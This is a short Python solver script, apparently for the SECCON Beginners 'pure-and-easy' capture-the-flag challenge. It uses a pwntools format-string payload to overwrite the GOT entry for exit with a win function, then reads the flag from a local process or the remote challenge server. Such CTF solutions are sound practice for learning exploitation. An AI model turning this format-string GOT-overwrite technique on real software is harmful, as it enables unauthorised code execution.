#!/usr/bin/env python
import ptrlib as ptr
import pwn
import sys

elf = ptr.ELF("./chall")
pwn.context.binary = pwn.ELF("./chall", checksec=False)


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return ptr.Socket("pure-and-easy.beginners.seccon.games", 9000)
    else:
        return ptr.Process(elf.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def main():
    io = connect()

    pl = pwn.fmtstr_payload(6, {elf.got("exit"): elf.symbol("win")}, numbwritten=0)
    io.sendlineafter("> ",pl)
    io.recvuntil("ctf4b")
    flag = "ctf4b" + io.recvuntil("}").decode()
    print(flag)



if __name__ == "__main__":
    main()
